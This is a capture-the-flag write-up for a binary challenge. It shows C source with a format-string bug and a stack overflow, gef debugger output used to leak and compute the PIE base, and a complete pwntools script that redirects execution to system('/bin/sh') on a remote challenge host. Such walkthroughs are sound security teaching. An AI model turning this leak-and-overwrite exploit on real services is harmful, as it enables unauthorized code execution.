# INFINITE RECURSION
Look at source code:
```
void fsb()
{   
    char buf[0x10];
    printf("fsb> ");
    scanf("%15s", buf);
    printf(buf);
}
void bof()
{
    char buf[0x10];
    printf("bof> ");
    scanf("%s", buf);
}
int rand_fun()
{
    if (rand() & 1)
        fsb();
    else
        bof();
    rand_fun();
}
void main()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    srand(time(0));
    printf("Try to escape haha >:)\n");
    rand_fun();
    system("/bin/sh");
}
```
There are 2 bugs here, one is buffer overflow in ``` bof ```, another is format string in fsb. Let's give it a try
```
fsb> %9$p
0x5602f99cf2d9bof>
```
The first thought is try to execute ```system("/bin/sh");``` at line 31. But we have PIE enabled here, so we have to leak and calculate ELF base.
```
gef➤  tel
0x00007fffffffdcf0│+0x0000: 0x0000006161616161 ("aaaaa"?)        ← $rsp, $rdi
0x00007fffffffdcf8│+0x0008: 0x00007ffff7e0dc29  →  <rand+0009> add rsp, 0x8
0x00007fffffffdd00│+0x0010: 0x00007fffffffdd10  →  0x00007fffffffdd20  →  0x0000000000000001     ← $rbp
0x00007fffffffdd08│+0x0018: 0x00005555555552d9  →  <rand_fun+0023> jmp 0x5555555552e5 <rand_fun+47>
```
We'll the return address of ``` fsb ``` function. Let's find it's offset:
```
gef➤  p/x 0x00005555555552d9-0x0000555555554000
$1 = 0x12d9
```
Then, calculate the address of the chunk of code that relevants to line 31. It is after the ``` rand_fun ``` in ``` main ```
![image](https://github.com/user-attachments/assets/90e83205-3ada-49d6-9fb8-f37f5cd0ee52)
```
gef➤  p/x 0x0000555555555366-0x0000555555554000
$2 = 0x1366
```

Go to ``` bof ```. We'll overwrite the return address with the address of that chunk of code.
```
gef➤  tel
0x00007fffffffdcf0│+0x0000: 0x0000616161616161 ("aaaaaa"?)       ← $rsp
0x00007fffffffdcf8│+0x0008: 0x00007ffff7e0dc29  →  <rand+0009> add rsp, 0x8
0x00007fffffffdd00│+0x0010: 0x00007fffffffdd10  →  0x00007fffffffdd20  →  0x0000000000000001     ← $rbp
0x00007fffffffdd08│+0x0018: 0x00005555555552e5  →  <rand_fun+002f> mov eax, 0x0
```
Finally, we should not try to identify the flow of ```rand_fun``` to jump into ```bof``` or ```fsb```, just run the script assuming that it will jump into ```fsb``` first and then ```bof``` until we success.
Here is script: 
```
#!/usr/bin/python3

from pwn import *

r = remote('23.146.248.230', 12355)
# r = process('./chal')

# gdb.attach(r, gdbscript='''
# b *bof+59
# c
# ''')

# format string to leak exe
r.sendlineafter(b'fsb> ', f'%9$p'.encode())
exe_leak = int(r.recvuntil(b'>', drop=True)[:-3],16)
print('[*]', exe_leak)
code_base = exe_leak-0x12d9
print('[*] code_base: ', code_base)
target_addr = code_base + 0x1366

payload = b'a'*24 + p64(target_addr)
r.sendline(payload)

r.interactive()
```
![image](https://github.com/user-attachments/assets/ed632e64-7445-4f4f-ad1e-df0abff9e119)




